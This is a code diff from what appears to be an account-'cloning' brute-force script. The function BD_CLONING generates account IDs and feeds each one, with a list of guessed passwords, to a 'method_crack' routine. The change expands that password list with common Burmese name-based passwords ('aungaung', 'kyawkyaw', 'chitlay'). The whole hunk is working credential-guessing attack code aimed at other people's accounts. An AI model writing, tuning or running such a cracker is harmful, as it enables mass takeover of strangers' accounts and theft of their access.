@@ -84,7 +84,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],'zawzaw','chitchit']
+            passlist=[psx,ids,ids[:6],'zawzaw','aungaung','kyawkyaw','chitlay','chitchit']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' THE PROGRESS HAS BEEN COMPLETE ')
